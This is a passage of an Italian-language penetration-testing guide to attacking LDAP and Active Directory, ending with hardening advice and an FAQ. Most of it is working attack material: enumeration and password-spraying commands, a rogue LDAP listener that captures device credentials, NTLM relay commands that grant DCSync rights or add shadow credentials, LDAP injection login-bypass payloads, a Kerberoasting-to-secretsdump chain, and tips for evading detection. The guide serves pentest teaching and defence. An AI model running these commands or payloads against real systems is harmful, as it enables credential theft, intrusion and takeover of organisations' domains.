# ldapdomaindump: users, groups, computers and policy in HTML, JSON and grep-friendly files
ldapdomaindump -u 'corp\jsmith' -p 'Password1' ldap://10.10.10.10 -o ldd/

# Collect BloodHound data over LDAP from Linux
bloodhound-python -u jsmith -p 'Password1' -d corp.local -ns 10.10.10.10 -c All --zip

# NetExec: check signing and channel binding, then look for quick wins
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' -M ldap-checker
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' -M laps
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' --gmsa
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' --trusted-for-delegation
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' --password-not-required
nxc ldap 10.10.10.10 -u jsmith -p 'Password1' -M adcs
```

`ldap-checker` ti dice se signing e channel binding sono richiesti, cioè se il relay verso LDAP e LDAPS è possibile. Quando trovi un permesso scrivibile su un oggetto, la tecnica successiva è in [ACL Abuse](https://hackita.it/articoli/acl-abuse/).

## 4. Tecniche Offensive

**Ricerca anonima (null bind) sugli oggetti**

Contesto: Domain Controller dove la ricerca anonima è stata aperta (`dsHeuristics` modificato e permessi ad `ANONYMOUS LOGON`). Non è il default di Active Directory. Lo trovi in reti vecchie o configurate male, e su molti OpenLDAP.

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

**Output (successo):**

```text
dn: CN=Administrator,CN=Users,DC=corp,DC=local
sAMAccountName: Administrator

dn: CN=Guest,CN=Users,DC=corp,DC=local
sAMAccountName: Guest

dn: CN=John Smith,OU=IT,DC=corp,DC=local
sAMAccountName: jsmith
[... more users ...]
```

**Output (fallimento, il caso normale su AD):**

```text
ldap_search_ext: Operations error (1)
    additional info: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

**Cosa fai dopo:** con la lista degli username (`| grep sAMAccountName | awk '{print $2}' > users.txt`) puoi fare password spraying: `nxc ldap 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success`. Se la ricerca anonima è chiusa, prova altre strade per ottenere gli utenti: [rpcclient](https://hackita.it/articoli/rpcclient/) e [enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) con la null session SMB/RPC. L'orchestrazione dell'attacco è nella guida a [NetExec](https://hackita.it/articoli/netexec/).

**LDAP Pass-back Attack**

Contesto: un dispositivo di rete (stampante, NAS, appliance) è configurato per autenticarsi via LDAP. Se puoi cambiare l'indirizzo del server LDAP nelle sue impostazioni, lo punti al tuo host e catturi le credenziali con cui prova ad autenticarsi.

```python
# rogue_ldap.py - minimal listener that prints the first packet sent by the device
# run with: sudo python3 rogue_ldap.py
import socketserver


class LDAPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(4096)
        print(f"[+] Connection from {self.client_address}")
        print(f"[+] Raw data: {data.hex()}")
        # The simple bind request carries the bind DN and the password in clear text
        print(f"[+] Decoded: {data.decode('utf-8', errors='ignore')}")


server = socketserver.TCPServer(("0.0.0.0", 389), LDAPHandler)
print("[*] Rogue LDAP server listening on 0.0.0.0:389")
server.serve_forever()
```

Per una prova veloce basta anche `sudo nc -lvnp 389`: il simple bind arriva in chiaro e lo leggi a schermo.

**Output (successo):**

```text
[*] Rogue LDAP server listening on 0.0.0.0:389
[+] Connection from ('10.10.10.200', 54321)
[+] Raw data: 30...
[+] Decoded: ...cn=ldap_bind,ou=Service Accounts,dc=corp,dc=local...LdapB1nd!Pass...
```

**Output (fallimento):**

```text
[*] Rogue LDAP server listening on 0.0.0.0:389
(no connection - the device does not use LDAP or was not reconfigured)
```

**Cosa fai dopo:** hai le credenziali del service account LDAP (`ldap_bind` / `LdapB1nd!Pass`). Provale su tutti i servizi del dominio: i service account LDAP hanno spesso permessi di lettura su tutta la directory. Se il dispositivo usa LDAPS o StartTLS non vedi nulla in chiaro: l'attacco funziona solo con il bind semplice non cifrato.

**Password negli attributi LDAP**

Contesto: gli amministratori salvano password temporanee o note nei campi `description`, `comment` o negli attributi custom degli oggetti AD.

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(&(objectClass=user)(description=*pass*))" sAMAccountName description
```

**Output (successo):**

```text
dn: CN=John Smith,OU=IT,DC=corp,DC=local
sAMAccountName: jsmith
description: Temp password: Welcome1!

dn: CN=New Hire 2026,OU=Users,DC=corp,DC=local
sAMAccountName: nhire01
description: Initial pwd = Corp2026!
```

**Output (fallimento):**

```text
# numEntries: 0
```

**Cosa fai dopo:** prova le password trovate, per esempio `nxc smb 10.10.10.10 -u jsmith -p 'Welcome1!'`, e se funzionano controlla i gruppi per capire il livello di privilegio. Il passo successivo è il [testing della porta 445 SMB](https://hackita.it/articoli/smb/).

**LDAP Relay**

Il relay inoltra un'autenticazione NTLM catturata verso LDAP o LDAPS, e con i privilegi di quella identità modifica la directory. È uno dei percorsi più potenti verso il Domain Admin, ma servono più condizioni insieme:

* Un'autenticazione NTLM catturabile (coercizione di un computer, [Responder](https://hackita.it/articoli/responder/), WebDAV o HTTP)
* Verso **LDAP (389)**: signing non richiesto sul DC, e l'autenticazione originale non deve aver negoziato il signing (tipico quando arriva da HTTP)
* Verso **LDAPS (636)**: channel binding non richiesto
* L'identità rilanciata deve avere i privilegi per fare la modifica: un computer account può scrivere su sé stesso o su alcuni attributi, non su tutto

```bash
# Relay to LDAPS: create a computer account and configure RBCD on the victim
impacket-ntlmrelayx -t ldaps://10.10.10.10 --delegate-access -smb2support

# Relay to LDAP: grant DCSync rights to a controlled user
impacket-ntlmrelayx -t ldap://10.10.10.10 --escalate-user jsmith -smb2support

# Relay to LDAPS: add shadow credentials to the victim account
impacket-ntlmrelayx -t ldaps://10.10.10.10 --shadow-credentials --shadow-target 'WS-DEV-01$' -smb2support
```

`--delegate-access` richiede che `MachineAccountQuota` sia maggiore di zero (lo controlli con `-M maq`) e prepara la [RBCD](https://hackita.it/articoli/rbcd/); `--escalate-user` dà i diritti per un [DCSync](https://hackita.it/articoli/dcsync/); `--shadow-credentials` aggiunge una chiave su un account (vedi [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)). Le guide: [NTLM Relay](https://hackita.it/articoli/ntlm-relay/), [ntlmrelayx](https://hackita.it/articoli/ntlmrelayx/) e, se il relay va verso la CA, [ESC8](https://hackita.it/articoli/esc8-adcs/). Se tutti i DC richiedono signing e channel binding, questo vettore è chiuso: è esattamente la difesa che trovi nell'ultima sezione.

**LDAP Injection (applicazioni web)**

Contesto: un'applicazione web usa LDAP per l'autenticazione e inserisce l'input dell'utente nel filtro senza validarlo. Il filtro tipico è `(&(uid=INPUT_USER)(userPassword=INPUT_PASS))`.

| Input nel campo username | Effetto sul filtro                                                                     |
| ------------------------ | -------------------------------------------------------------------------------------- |
| `*`                      | `(uid=*)`: corrisponde a qualsiasi utente                                              |
| `admin*`                 | Corrisponde a tutti gli utenti che iniziano per `admin`                                |
| `admin)(&)`              | Chiude il filtro con una condizione sempre vera: la password non viene più controllata |
| `*)(uid=*))(\|(uid=*`    | Altera la struttura per rendere la condizione sempre vera                              |
| `admin)(description=a*`  | Blind injection: la risposta cambia se la description inizia per `a`                   |

```bash
# Test the login form with an always-true username
curl -s -i -X POST https://app.corp.local/login --data-urlencode 'username=admin)(&)' --data-urlencode 'password=anything'
```

**Output (successo):**

```text
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJ...
```

**Output (fallimento):**

```text
HTTP/1.1 401 Unauthorized
X-Error: Invalid credentials
```

**Cosa fai dopo:** se sei entrato, mappa le funzionalità dell'applicazione per trovare altri vettori (upload, command injection, SSRF verso la rete interna). La guida completa con tutti i payload è [LDAP Injection](https://hackita.it/articoli/ldap-injection/).

**Come si corregge**

L'input dell'utente non deve mai finire nel filtro così com'è. Va protetto con l'escape dei caratteri speciali (RFC 4515):

```python
from ldap3.utils.conv import escape_filter_chars

# Vulnerable: the input goes straight into the filter
flt = f"(&(uid={username})(userPassword={password}))"

# Fixed: special characters are escaped before building the filter
flt = f"(&(uid={escape_filter_chars(username)})(userPassword={escape_filter_chars(password)}))"
```

| Carattere | Escape nel filtro |
| --------- | ----------------- |
| `*`       | `\2a`             |
| `(`       | `\28`             |
| `)`       | `\29`             |
| `\`       | `\5c`             |
| NUL       | `\00`             |

Con l'escape, `admin)(&)` diventa un nome utente letterale e non fa più parte della struttura del filtro. La difesa migliore è non confrontare la password nel filtro: cerca l'utente (con l'escape), poi fai un bind con il suo DN e la password e lascia che sia il server a verificarla. Il **DN** ha regole diverse (RFC 4514: vanno protetti `,` `+` `"` `\` `<` `>` `;`): usa `escape_rdn` di `ldap3.utils.dn`, non l'escape del filtro.

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise AD, Domain Controller raggiungibile senza credenziali

**Situazione:** rete corporate con dominio AD `corp.local`. Il Domain Controller è raggiungibile dalla VLAN utenti. Nessun accesso autenticato iniziale.

**Step 1:**

```bash
nmap -sV -p 389,636,3268 10.10.10.10 -Pn
```

**Output atteso:**

```text
389/tcp  open  ldap    Microsoft Windows Active Directory LDAP
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
```

**Step 2:**

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName | awk '{print $2}' > users.txt && wc -l users.txt
```

**Output atteso:**

```text
347 users.txt
```

**Se fallisce:**

* Causa probabile: la ricerca anonima è chiusa, che è il default di Active Directory (`Operations error`)
* Fix: usa [enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) con `-A 10.10.10.10`, che prova RPC, LDAP e SMB, oppure [rpcclient](https://hackita.it/articoli/rpcclient/) con `enumdomusers` se la null session RPC è permessa

**Tempo stimato:** 5-15 minuti

### Scenario 2: Lab con OpenLDAP configurato male

**Situazione:** server Linux con OpenLDAP esposto. La directory serve per l'autenticazione centralizzata. Nessuna restrizione sulle query.

**Step 1:**

```bash
ldapsearch -x -H ldap://10.10.10.50 -b "" -s base namingContexts
```

**Output atteso:**

```text
namingContexts: dc=lab,dc=local
```

**Step 2:**

```bash
ldapsearch -x -H ldap://10.10.10.50 -b "dc=lab,dc=local" "(objectClass=posixAccount)" uid userPassword
```

**Output atteso:**

```text
dn: uid=admin,ou=People,dc=lab,dc=local
uid: admin
userPassword: {SSHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=

dn: uid=developer,ou=People,dc=lab,dc=local
uid: developer
userPassword: {SSHA}nU4eI71bcnBGqeO0t9tXvY1u5oQ=
```

I valori `{SSHA}` sono hash salted SHA-1 e si crackano offline con [Hashcat](https://hackita.it/articoli/hashcat/) (`-m 111`).

**Se fallisce:**

* Causa probabile: le ACL di OpenLDAP impediscono la lettura di `userPassword`
* Fix: cerca altri attributi sensibili, per esempio `ldapsearch ... "(objectClass=*)" uid cn description telephoneNumber`

**Tempo stimato:** 5-10 minuti

### Scenario 3: Ambiente con EDR e LDAP signing obbligatorio

**Situazione:** ambiente enterprise con EDR attivo e LDAP signing obbligatorio. Hai credenziali a bassi privilegi ottenute via phishing. Un simple bind sulla 389 viene rifiutato, quindi usi LDAPS.

**Step 1:**

```bash
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.10:636 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=domainDNS)" msDS-Behavior-Version
```

**Output atteso:**

```text
dn: DC=corp,DC=local
msDS-Behavior-Version: 7
```

**Step 2:**

```bash
cat > ldap_admins.py << 'EOF'
from ldap3 import Server, Connection, ALL, NTLM

# NTLM over LDAPS: works when signing is required, because TLS protects the session
server = Server("10.10.10.10", port=636, use_ssl=True, get_info=ALL)
conn = Connection(server, user="corp\\jsmith", password="Password1", authentication=NTLM, auto_bind=True)
conn.search("DC=corp,DC=local", "(&(objectClass=user)(adminCount=1))", attributes=["sAMAccountName", "memberOf"])
for entry in conn.entries:
    print(entry)
EOF
python3 ldap_admins.py
```

**Output atteso:**

```text
DN: CN=Administrator,CN=Users,DC=corp,DC=local - STATUS: Read - READ TIME: ...
    memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
    sAMAccountName: Administrator

DN: CN=SQL Admin,OU=Admins,DC=corp,DC=local - STATUS: Read
    memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
    sAMAccountName: sqladmin
```

**Se fallisce:**

* Causa probabile: il certificato del DC non è valido o il DC richiede anche il channel binding, che `ldap3` standard non gestisce
* Fix: prova `nxc ldap`, che negozia signing e LDAPS da solo, oppure SASL GSSAPI con Kerberos (`kinit` e `ldapsearch -Y GSSAPI`)

**Tempo stimato:** 10-20 minuti

## 6. Attack Chain Completa

```text
Recon (scan LDAP ports) → Bind / Auth → User Enumeration → Password Policy → Password Spraying → SPN Extraction → Kerberoasting → PrivEsc (DA) → DCSync
```

| Fase            | Tool       | Comando chiave                                                          | Output/Risultato                      |
| --------------- | ---------- | ----------------------------------------------------------------------- | ------------------------------------- |
| Recon           | nmap       | `nmap -sV -p 389,636,3268 [DC]`                                         | DC identificato, naming context       |
| Bind test       | ldapsearch | `ldapsearch -x -H ldap://[DC] -b "" namingContexts`                     | RootDSE e prova della ricerca anonima |
| User enum       | ldapsearch | `ldapsearch ... "(objectClass=user)" sAMAccountName`                    | Lista username completa               |
| Password policy | ldapsearch | `ldapsearch ... "(objectClass=domainDNS)" lockoutThreshold`             | Soglia e tempi di lockout             |
| Password spray  | nxc        | `nxc ldap [DC] -u users.txt -p 'Season2026!'`                           | Account compromessi                   |
| SPN extract     | ldapsearch | `ldapsearch ... "(servicePrincipalName=*)"`                             | Service account con SPN               |
| Kerberoasting   | impacket   | `impacket-GetUserSPNs corp.local/jsmith:Password1 -dc-ip [DC] -request` | Hash TGS da crackare offline          |
| Cracking        | hashcat    | `hashcat -m 13100 tgs_hash.txt wordlist.txt`                            | Password del service account          |
| DCSync          | impacket   | `impacket-secretsdump corp.local/sqladmin:SqlP4ss@[DC]`                 | Hash NTLM di tutti gli utenti         |

**Timeline stimata:** 60-240 minuti. Il collo di bottiglia è il password spraying (devi rispettare i timer di lockout) e il crack offline degli hash TGS. Per il passo finale vedi [secretsdump](https://hackita.it/articoli/secretsdump/) e [DCSync](https://hackita.it/articoli/dcsync/).

**Ruolo di LDAP:** è la base di quasi ogni attacco su Active Directory. Senza LDAP non hai utenti, SPN e policy. Tecniche come Kerberoasting, password spraying e abuso delle ACL partono dai dati estratti da qui. Il quadro d'insieme è in [Active Directory](https://hackita.it/articoli/active-directory/).

## 7. Detection ed Evasion

### Cosa monitora il Blue Team

* **Event ID 2889** (registro *Directory Service*): bind LDAP non firmati o simple bind in chiaro. Si genera solo se abiliti il logging diagnostico `16 LDAP Interface Events` a livello 2
* **Event ID 2887**: riepilogo giornaliero del numero di bind non firmati
* **Event ID 1644**: query LDAP costose o molto ampie (richiede il logging diagnostico `15 Field Engineering` a livello 5 in `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics`)
* **SIEM**: allarmi su query LDAP massive da IP che non sono DC (base DN radice, scope subtree, filtro `objectClass=user`)
* **EDR e rete**: tool come BloodHound e SharpHound producono schemi di query LDAP molto riconoscibili

### Tecniche di evasion

| Tecnica           | Come                                                                                 | Riduzione del rumore                                                                     |
| ----------------- | ------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------- |
| Query frammentate | Invece di un solo `ldapsearch` con `(objectClass=user)`, una query per OU alla volta | Ogni query restituisce pochi risultati e non fa scattare gli allarmi sulle query massive |
| LDAPS (porta 636) | `ldapsearch -H ldaps://[DC]:636` con le stesse query                                 | Il contenuto è cifrato: la rete vede solo il volume del traffico, non le query           |
| Rate limiting     | Pausa di 2-5 secondi tra le query e paged results con pagine piccole (50-100)        | Le query somigliano a un client LDAP normale (Outlook, aggiornamento delle GPO)          |

LDAPS nasconde il contenuto alla rete, ma non al Domain Controller: gli eventi 1644 vedono comunque filtro e IP sorgente.

### Cleanup post-exploitation

* Le query LDAP non lasciano file sul DC, ma generano log nel registro eventi
* Con l'Event ID 1644 abilitato, le tue query sono registrate con IP sorgente e filtro
* Non puoi cancellare gli Event Log senza accesso privilegiato al DC
* Riduci le tracce usando le credenziali di un utente con attività LDAP normale (helpdesk, service account di monitoraggio)

### Analisi del traffico LDAP con Wireshark

Per vedere cosa passa sulla rete, in [Wireshark](https://hackita.it/articoli/wireshark/) usa questi filtri:

```text
ldap
tcp.port == 389
ldap.protocolOp == 0
```

Il primo mostra tutto il traffico LDAP, il secondo filtra per porta, il terzo mostra solo i bind request (`protocolOp` 0). Su un simple bind in chiaro nel dettaglio del pacchetto leggi DN e password. Se vedi LDAP su 389 con password leggibili, hai appena trovato un problema da riportare.

## 8. Toolchain e Confronto

### Pipeline operativa

```text
nmap (scan 389/636/3268) → ldapsearch/ldap3/nxc (enum) → nxc (spray) → impacket (Kerberoasting/DCSync) → hashcat (crack) → secretsdump (hash dump)
```

Dati che passano tra le fasi: naming context, lista username, password policy, lista SPN, credenziali valide, hash TGS, hash NTLM.

### Tabella comparativa

| Aspetto                  | LDAP (389/TCP)                  | LDAPS (636/TCP)                         | Global Catalog (3268/TCP)                          |
| ------------------------ | ------------------------------- | --------------------------------------- | -------------------------------------------------- |
| Porta default            | 389                             | 636                                     | 3268 (3269 con TLS)                                |
| Cifratura                | No (chiaro), StartTLS possibile | TLS nativo                              | No (chiaro)                                        |
| Scope                    | Singolo dominio                 | Singolo dominio                         | Intera foresta AD                                  |
| Attributi disponibili    | Tutti                           | Tutti                                   | Solo il partial attribute set                      |
| Metodi di autenticazione | Simple, SASL, NTLM              | Simple, SASL, NTLM                      | Come LDAP                                          |
| Quando preferirlo        | Enumerazione di un solo dominio | Quando serve cifratura o c'è il signing | Enumerazione cross-domain in foreste multi-dominio |

## 9. Troubleshooting

| Errore / Sintomo                                      | Causa                                                                  | Fix                                                                                                |
| ----------------------------------------------------- | ---------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `ldap_bind: Invalid credentials (49)`                 | Username o password errati, o formato del DN sbagliato                 | Prova formati diversi: `corp\user`, `user@corp.local`, `CN=user,DC=corp,DC=local`                  |
| `ldap_bind: Inappropriate authentication (48)`        | Il server non accetta il tipo di bind richiesto (per esempio anonimo)  | Autenticati con credenziali valide: `-D "corp\user" -w "pass"`                                     |
| `Operations error (1)` su una ricerca                 | Nessun bind riuscito: la ricerca anonima è chiusa                      | Autenticati, oppure ripiega su RPC/SMB                                                             |
| `Strong(er) authentication required (8)`              | Il DC richiede il signing e rifiuta il simple bind in chiaro           | Usa LDAPS, StartTLS (`-ZZ`) o SASL GSSAPI (`-Y GSSAPI`)                                            |
| `Can't contact LDAP server (-1)`                      | Porta filtrata, hostname non risolto o certificato TLS non valido      | IP diretto, controlla con `nc -nv [target] 389 -w 3`; con LDAPS prova `LDAPTLS_REQCERT=never`      |
| `ldap_start_tls: Connect error (-11)`                 | Certificato del DC non valido, non fidato o con nome diverso dall'host | Usa il FQDN del DC e indica la CA con `LDAPTLS_CACERT=ca.pem`; solo in lab `LDAPTLS_REQCERT=never` |
| `Size limit exceeded`                                 | Il DC limita i risultati per singola query                             | Usa le pagine: `-E pr=500/noprompt`                                                                |
| Query lenta su domini grandi                          | Troppi risultati senza filtro specifico                                | Restringi il filtro: `"(&(objectClass=user)(sAMAccountName=admin*))"`                              |
| Con Kerberos: `Server not found in Kerberos database` | Usi l'IP al posto del FQDN                                             | Usa il nome del DC (`dc01.corp.local`) e controlla DNS e orario                                    |

## 10. Cheat Sheet Finale

| Azione                  | Comando                                                                                                 | Note                                         |
| ----------------------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------- |
| Scansione LDAP          | `nmap -sV -sC -p 389,636,3268,3269 [DC]`                                                                | Rileva AD e versione                         |
| RootDSE                 | `ldapsearch -x -H ldap://[DC] -b "" -s base namingContexts`                                             | Su AD risponde sempre                        |
| Ricerca anonima         | `ldapsearch -x -H ldap://[DC] -b "DC=x,DC=y" "(objectClass=user)" sAMAccountName`                       | Se risponde, la ricerca anonima è aperta     |
| Enum utenti             | `ldapsearch -x -H ldap://[DC] -D "dom\user" -w pass -b "DC=x,DC=y" "(objectClass=user)" sAMAccountName` | Aggiungi `-E pr=1000/noprompt` per le pagine |
| LDAPS                   | `LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://[DC]:636 ...`                                           | Se il signing è richiesto                    |
| Password in description | `ldapsearch ... "(&(objectClass=user)(description=*pass*))" description`                                | Credenziali in chiaro frequenti              |
| Estrai SPN              | `ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName`                         | Per il Kerberoasting                         |
| Policy password         | `ldapsearch ... "(objectClass=domainDNS)" lockoutThreshold minPwdLength`                                | Calibra lo spray                             |
| Enum computer           | `ldapsearch ... "(objectClass=computer)" cn operatingSystem dNSHostName`                                | Mappa host e OS                              |
| Enum con NetExec        | `nxc ldap [DC] -u user -p pass --users`                                                                 | Gestisce signing e LDAPS                     |
| Kerberoasting           | `impacket-GetUserSPNs corp.local/user:pass -dc-ip [DC] -request`                                        | Richiede impacket                            |
| Spray via LDAP          | `nxc ldap [DC] -u users.txt -p 'Password1' --continue-on-success`                                       | Rispetta il lockout                          |
| Relay verso LDAPS       | `impacket-ntlmrelayx -t ldaps://[DC] --delegate-access`                                                 | Richiede un'autenticazione NTLM in transito  |
| Query PowerShell        | `([adsisearcher]"(objectClass=user)").FindAll()`                                                        | Solo componenti già presenti in Windows      |
| Trova i DC              | `dig -t SRV _ldap._tcp.dc._msdcs.[dominio]`                                                             | Records SRV del DNS                          |

### Perché LDAP è ancora rilevante nel 2026

Active Directory resta il centro dell'autenticazione in gran parte delle reti aziendali e ogni Domain Controller espone LDAP. Entra ID non sostituisce l'AD locale nella maggior parte delle organizzazioni: lo estende in un modello ibrido. LDAP è quindi il primo posto dove guardare in qualsiasi internal pentest, partendo da `nmap -p 389 --script ldap-rootdse [DC]` e da una verifica di signing e ricerca anonima.

### OPSEC per il Red Team

Le query LDAP generano molto traffico se fai dump completi: un `ldapsearch` su tutto il dominio produce migliaia di pacchetti in pochi secondi, un comportamento anomalo per un client normale. Per ridurre la visibilità usa query mirate per OU, paging con pagine da 100, pause tra le query e LDAPS per nascondere il contenuto alla rete. Ricorda che l'Event ID 1644, se abilitato, registra ogni tua query con filtro e IP sorgente, e che un collector come BloodHound ha un'impronta riconoscibile.

## LDAP Security Best Practices: Difesa e Hardening

Verifica sempre lo stato reale prima di cambiare una policy sui Domain Controller: LDAP signing e channel binding vanno prima in audit, poi imposti l'obbligo, altrimenti rompi i client vecchi.

* **LDAP signing richiesto:** policy *Domain controller: LDAP server signing requirements* = `Require signing` (chiave `LDAPServerIntegrity = 2`). I simple bind non cifrati vengono rifiutati
* **Channel binding:** policy *Domain controller: LDAP server channel binding token requirements*, oppure `LdapEnforceChannelBinding = 2` (`Always`). Parti da `1` (`When supported`) dopo aver controllato i log
* **Client:** policy *Network security: LDAP client signing requirements* = `Require signing` sui client
* **LDAPS con certificato valido** sui Domain Controller, e uso di LDAPS o StartTLS per ogni applicazione che fa bind semplice
* **Accesso anonimo chiuso:** non modificare `dsHeuristics` e non dare permessi ad `ANONYMOUS LOGON`. Controlla il valore attuale:

```powershell
Get-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties dsHeuristics | Select-Object dsHeuristics
```

* **LAPS e gMSA:** limita chi può leggere `ms-Mcs-AdmPwd`, `msLAPS-Password` e `msDS-GroupManagedServiceAccountPassword` ai soli gruppi che ne hanno bisogno, e controlla i permessi con la stessa query che usa un attaccante
* **`MachineAccountQuota` a 0**, così un utente qualsiasi non può creare computer account per i relay con RBCD
* **Niente password negli attributi:** controlla periodicamente `description`, `info` e `comment` con la stessa query che usa un attaccante
* **Rete:** consenti 389, 636, 3268 e 3269 verso i Domain Controller solo dai segmenti che ne hanno bisogno, e blocca LDAP verso Internet
* **Dispositivi con LDAP (stampanti, NAS):** usa un account dedicato di sola lettura, LDAPS, e cambia la password periodicamente: così il pass-back non porta a niente di utile
* **Monitoraggio:** abilita il logging di 2889 e controlla 2887 e 1644; allarmi su ricerche LDAP massive da host che non sono DC
* **Aggiornamenti:** tieni aggiornati Windows Server e OpenLDAP, e verifica i default dei nuovi sistemi invece di darli per scontati

Un Domain Controller con signing e channel binding richiesti, ricerca anonima chiusa e `MachineAccountQuota` a zero toglie all'attaccante quasi tutti i percorsi descritti in questa guida.

## FAQ

**Cos'è LDAP?** È il `Lightweight Directory Access Protocol`, il significato è: protocollo leggero per accedere alle directory. Serve a cercare, leggere e modificare utenti, gruppi e computer in una directory, ed è anche usato per verificare le credenziali.

**A cosa serve LDAP?** Serve per autenticare gli utenti, cercare informazioni sulle persone e sui computer e centralizzare gli account della rete. In una rete Windows è il linguaggio con cui si interroga Active Directory.

**Cosa significa LDAP?** Sta per Lightweight Directory Access Protocol. Si chiama "leggero" perché nasce come versione semplificata di un protocollo di directory più pesante.

**Che porta usa LDAP?** La porta predefinita è la 389 (LDAP standard), la 636 per LDAPS (cifrato), la 3268 per il Global Catalog e la 3269 per il Global Catalog su TLS. Sulla 389 UDP c'è CLDAP, usato da Active Directory per trovare i Domain Controller.

**Qual è la porta LDAP sicura?** La 636 per LDAPS, oppure la 389 con StartTLS. Per il Global Catalog cifrato è la 3269.

**Qual è la differenza tra LDAP e LDAPS?** LDAP sulla 389 viaggia in chiaro, LDAPS sulla 636 è cifrato con TLS dall'inizio. Con LDAP in chiaro le credenziali di un simple bind si possono leggere in rete.

**LDAP è sicuro?** Dipende da come è configurato. In chiaro, senza signing e con ricerca anonima aperta no. Con LDAPS o StartTLS, signing e channel binding richiesti e permessi ben limitati sì.

**La porta 389 è cifrata?** No, per default trasmette in chiaro, comprese le credenziali di un simple bind. Per cifrare usa LDAPS sulla 636 o StartTLS sulla 389.

**Come verifico se il null bind è abilitato?** Su Active Directory la RootDSE risponde sempre, quindi prova una ricerca vera: `ldapsearch -x -H ldap://[target] -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName`. Se restituisce utenti senza credenziali, la ricerca anonima è aperta. Se risponde `Operations error`, è chiusa.

**Come estraggo tutti gli utenti di Active Directory via LDAP?** Con credenziali valide: `ldapsearch -x -H ldap://[DC] -D "domain\user" -w "pass" -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName`. Aggiungi `-E pr=1000/noprompt` per le pagine nei domini con più di 1000 utenti, oppure usa `nxc ldap [DC] -u user -p pass --users`.

**Qual è la differenza tra la porta 389 e la 3268?** La 389 interroga il dominio locale con tutti gli attributi. La 3268 interroga l'intera foresta ma restituisce solo un sottoinsieme di attributi (il partial attribute set), quindi serve nelle foreste con più domini.

**LDAP usa TCP o UDP?** Normalmente TCP, sulla 389 (LDAP) e sulla 636 (LDAPS). Sulla 389 UDP c'è CLDAP, usato da Active Directory per localizzare i Domain Controller.

**Cos'è StartTLS e che differenza c'è con LDAPS?** StartTLS cifra con TLS una connessione già aperta sulla 389, LDAPS è cifrato dall'inizio sulla 636. Il risultato è lo stesso, cambia il momento in cui parte il TLS.

**Come si testa una connessione LDAPS?** Con `openssl s_client -connect [DC]:636 -showcerts`: se vedi il certificato, il TLS funziona. Per StartTLS usa `openssl s_client -connect [DC]:389 -starttls ldap` oppure `ldapsearch -ZZ`.

**Cos'è la RootDSE?** È la voce speciale che ogni server LDAP espone senza credenziali: contiene i naming context, il livello funzionale, il nome host e i meccanismi SASL. Si legge con `ldapsearch -x -H ldap://[DC] -b "" -s base`.

**Cos'è il Global Catalog?** È una copia di sola lettura, con un sottoinsieme di attributi, di tutti gli oggetti della foresta Active Directory. Si interroga sulla 3268 (3269 con TLS) per cercare utenti e gruppi in più domini.

**Che differenza c'è tra LDAP signing e channel binding?** Il signing firma i messaggi su LDAP in chiaro (389) e chiude il relay verso la 389. Il channel binding lega l'autenticazione alla sessione TLS e chiude il relay verso LDAPS (636). Servono tutti e due.

**Cos'è un server LDAP?** È il servizio che ospita la directory e risponde alle query. Sono server LDAP sia Active Directory su Windows sia OpenLDAP (`slapd`) su Linux.

**Cos'è un account LDAP?** È un account della directory che si autentica con un bind. Le applicazioni usano spesso un account di servizio LDAP in sola lettura per cercare gli utenti.

**Active Directory e LDAP sono la stessa cosa?** No. Active Directory è il servizio di directory di Microsoft, LDAP è uno dei protocolli con cui lo si interroga (insieme a Kerberos, DNS e SMB).

**Che differenza c'è tra LDAP e SAML?** LDAP interroga una directory e verifica credenziali in una rete interna; SAML serve per il single sign-on su applicazioni web. Spesso il provider SAML legge gli utenti da una directory LDAP.

**LDAP injection funziona ancora nel 2026?** Sì, sulle applicazioni custom che costruiscono il filtro LDAP concatenando l'input dell'utente. I framework moderni usano query parametrizzate, ma le applicazioni legacy restano vulnerabili. Trovi payload e dettagli in [LDAP Injection](https://hackita.it/articoli/ldap-injection/).

**Come si fa il Kerberoasting partendo da LDAP?** Prima estrai gli SPN con `(servicePrincipalName=*)`, poi richiedi un TGS per ciascuno con `impacket-GetUserSPNs domain/user:pass -dc-ip [DC] -request` e crackka l'hash offline con Hashcat (`-m 13100`). La tecnica è spiegata in [Kerberoasting](https://hackita.it/articoli/kerberoasting/).

**Come posso difendere LDAP?** Richiedi LDAP signing e channel binding sui Domain Controller, usa LDAPS o StartTLS, tieni chiusa la ricerca anonima, porta `MachineAccountQuota` a zero e controlla gli eventi 2889 e 1644.

